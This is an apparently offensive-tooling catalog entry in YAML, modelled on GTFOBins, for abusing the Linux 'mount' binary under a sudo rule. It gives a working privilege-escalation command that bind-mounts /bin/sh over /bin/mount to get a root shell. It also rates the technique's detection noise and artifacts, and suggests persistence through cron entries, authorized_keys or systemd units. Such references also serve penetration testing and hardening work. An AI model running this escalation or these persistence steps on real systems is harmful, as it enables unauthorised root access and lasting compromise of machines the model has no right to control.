---
name: mount
capabilities:
- exec
- suid
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: |-
    mount -o bind /bin/sh /bin/mount
    mount
  notes: This overrides `mount` itself with a shell (or any other executable).
references:
- https://gtfobins.github.io/gtfobins/mount/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
